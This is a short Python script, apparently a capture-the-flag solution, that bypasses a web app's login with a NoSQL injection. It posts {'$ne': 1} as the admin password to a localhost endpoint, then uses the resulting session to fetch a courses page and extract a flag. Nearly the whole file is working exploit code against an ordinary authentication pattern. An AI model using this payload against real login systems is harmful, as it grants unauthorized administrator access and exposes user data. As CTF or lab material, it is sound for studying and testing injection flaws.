#make post request

from wsgiref import headers
import requests
import json


#main function
def main():

    post_url = "http://localhost/users/login"
    courses_url = "http://localhost/courses"

    payload={
        "name":"admin",
        "password":{"$ne": 1} #nosql injection

    }
    headers = {
        'Content-Type': "application/json",
        'User-Agent': "PostmanRuntime/7.15.2",
        'Accept': "*/*",
        'Cache-Control': "no-cache",

    }

    #create session 
    s = requests.Session()
    #post request
    r = s.post(post_url, data=json.dumps(payload), headers=headers)

    #get courses with admin cookie

    r = s.get(courses_url)
    #print flag
    #print(r.text)
    print(r.text.split("Owner: admin")[1].split("</p>")[0].split(">")[2])
    
if __name__ == "__main__":
    main()
    
